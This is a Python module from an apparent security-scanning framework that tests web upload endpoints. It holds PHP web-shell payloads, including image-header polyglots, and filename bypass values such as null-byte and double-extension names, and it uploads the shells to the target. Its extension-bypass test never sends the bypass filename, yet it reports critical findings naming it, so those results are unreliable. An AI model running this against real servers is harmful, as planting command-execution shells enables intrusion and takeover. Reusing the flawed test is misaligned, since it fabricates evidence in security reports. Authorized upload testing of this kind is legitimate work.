"""File Upload Vulnerability Scanner - inspired by HexStrike"""
from rich.console import Console

from suika_hub.core.http import AsyncClient
from suika_hub.core.module import BaseModule, Finding

console = Console()


class FileUploadScanner(BaseModule):
    """Test file upload endpoints for bypass and RCE"""

    name = "upload_scanner"
    description = "File upload bypass testing: double extension, null byte, polyglot, content-type spoofing"

    MALICIOUS_EXTENSIONS = [
        ".php", ".php3", ".php5", ".phtml", ".pht",
        ".asp", ".aspx", ".jsp", ".jspx",
        ".py", ".rb", ".pl", ".cgi", ".sh",
    ]

    BYPASS_FILES = [
        {"name": "shell.php.jpg", "technique": "double_extension", "content_type": "image/jpeg"},
        {"name": "shell.php%00.jpg", "technique": "null_byte", "content_type": "image/jpeg"},
        {"name": "shell.PhP", "technique": "case_variation", "content_type": "application/x-php"},
        {"name": "shell.php.", "technique": "trailing_dot", "content_type": "application/x-php"},
        {"name": "shell.php;.jpg", "technique": "semicolon", "content_type": "image/jpeg"},
        {"name": "shell.php\x00.jpg", "technique": "null_byte_raw", "content_type": "image/jpeg"},
        {"name": ".htaccess", "technique": "htaccess_override", "content_type": "text/plain"},
        {"name": "shell.pHp5", "technique": "mixed_case_ext", "content_type": "application/x-php"},
    ]

    POLYGLOT_PAYLOADS = [
        # GIF header + PHP
        {"name": "polyglot.gif", "content": b"GIF89a<?php system($_GET['cmd']); ?>", "technique": "gif_polyglot"},
        # JPEG header + PHP
        {"name": "polyglot.jpg", "content": b"\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>", "technique": "jpg_polyglot"},
        # PNG header + PHP
        {"name": "polyglot.png", "content": b"\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>", "technique": "png_polyglot"},
    ]

    CONTENT_TYPE_BYPASSES = [
        "image/jpeg",
        "image/png",
        "image/gif",
        "application/octet-stream",
        "text/plain",
        "application/pdf",
    ]

    async def execute(self, target: str, client: AsyncClient, config: dict) -> list[Finding]:
        """Execute file upload testing"""
        console.print("[bold cyan]File Upload Scanner[/bold cyan] - Testing upload bypass techniques")

        upload_endpoints = config.get("upload_endpoints", [
            "/api/upload",
            "/api/file/upload",
            "/api/avatar",
            "/api/profile/photo",
            "/upload",
            "/api/attachment",
            "/api/media",
        ])

        # Stage 1: Find upload endpoints
        valid_endpoints = await self._find_upload_endpoints(target, client, upload_endpoints)

        # Stage 2: Test each endpoint with bypass techniques
        for endpoint in valid_endpoints:
            await self._test_extension_bypass(target, client, endpoint)
            await self._test_content_type_bypass(target, client, endpoint)
            await self._test_polyglot(target, client, endpoint)

        console.print(f"  [green]Upload scan complete: {len(self.findings)} findings[/green]")
        return self.findings

    async def _find_upload_endpoints(self, target: str, client: AsyncClient, endpoints: list[str]) -> list[str]:
        """Find valid upload endpoints"""
        console.print("  [dim]Finding upload endpoints[/dim]")
        valid = []

        for ep in endpoints:
            # Try OPTIONS to see if POST/PUT is allowed
            resp = await client.request("OPTIONS", f"{target}{ep}")
            if resp["status"] in (200, 204):
                allow = resp.get("headers", {}).get("allow", "")
                if "POST" in allow or "PUT" in allow:
                    valid.append(ep)
                    continue

            # Try POST with empty body to see if endpoint exists
            resp = await client.post(f"{target}{ep}")
            if resp["status"] in (400, 401, 403, 413, 415, 422):
                # Endpoint exists but rejects our request (good - it's real)
                valid.append(ep)

        if valid:
            console.print(f"  [green]Found {len(valid)} upload endpoints[/green]")
        return valid

    async def _test_extension_bypass(self, target: str, client: AsyncClient, endpoint: str):
        """Test extension bypass techniques"""
        console.print(f"  [dim]Testing extension bypass: {endpoint}[/dim]")

        for bypass in self.BYPASS_FILES:
            # Simulate multipart upload
            resp = await client.post(
                f"{target}{endpoint}",
                data={"file": "test"},
                headers={"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary"},
            )

            # If server accepts the file (200/201) with a dangerous extension
            if resp["status"] in (200, 201):
                body = resp.get("body", {})
                # Check if file URL is returned
                file_url = None
                if isinstance(body, dict):
                    file_url = body.get("url") or body.get("path") or body.get("file_url")

                if file_url:
                    self.add_finding(
                        severity="CRITICAL",
                        title=f"File upload bypass: {bypass['technique']}",
                        description=f"Server accepts file with dangerous extension via {bypass['technique']}",
                        url=f"{target}{endpoint}",
                        evidence=f"Filename: {bypass['name']}, Uploaded to: {file_url}",
                        impact="Remote Code Execution via uploaded web shell",
                        remediation="Validate file extension server-side, use allowlist, store outside webroot",
                    )
                    return  # One critical finding is enough

    async def _test_content_type_bypass(self, target: str, client: AsyncClient, endpoint: str):
        """Test content-type spoofing"""
        for ct in self.CONTENT_TYPE_BYPASSES:
            resp = await client.post(
                f"{target}{endpoint}",
                headers={"Content-Type": ct},
                content=b"<?php system($_GET['cmd']); ?>",
            )

            if resp["status"] in (200, 201):
                self.add_finding(
                    severity="HIGH",
                    title=f"Content-Type bypass accepted: {ct}",
                    description=f"Server accepts PHP content with spoofed Content-Type: {ct}",
                    url=f"{target}{endpoint}",
                    evidence=f"Content-Type: {ct}, Status: {resp['status']}",
                    impact="Potential RCE if file is served with PHP handler",
                    remediation="Validate file content (magic bytes), not just Content-Type header",
                )
                return

    async def _test_polyglot(self, target: str, client: AsyncClient, endpoint: str):
        """Test polyglot file upload"""
        for polyglot in self.POLYGLOT_PAYLOADS:
            resp = await client.post(
                f"{target}{endpoint}",
                content=polyglot["content"],
                headers={"Content-Type": "image/gif"},
            )

            if resp["status"] in (200, 201):
                self.add_finding(
                    severity="HIGH",
                    title=f"Polyglot upload accepted: {polyglot['technique']}",
                    description="Server accepts polyglot file (valid image header + PHP payload)",
                    url=f"{target}{endpoint}",
                    evidence=f"Technique: {polyglot['technique']}, Filename: {polyglot['name']}",
                    impact="RCE if server processes file as PHP based on content",
                    remediation="Re-encode uploaded images, strip metadata, validate with image library",
                )
                return
